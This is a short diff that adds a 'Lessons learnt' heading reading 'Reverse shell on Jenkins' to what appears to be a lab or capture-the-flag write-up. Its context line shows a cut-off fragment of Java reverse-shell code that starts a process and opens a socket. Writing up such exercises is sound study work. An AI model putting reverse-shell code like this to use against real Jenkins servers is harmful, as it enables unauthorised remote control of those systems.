@@ -31,4 +31,10 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ----
 
+#### Lessons learnt
+
+- Reverse shell on Jenkins
+
+----
+
 EOF
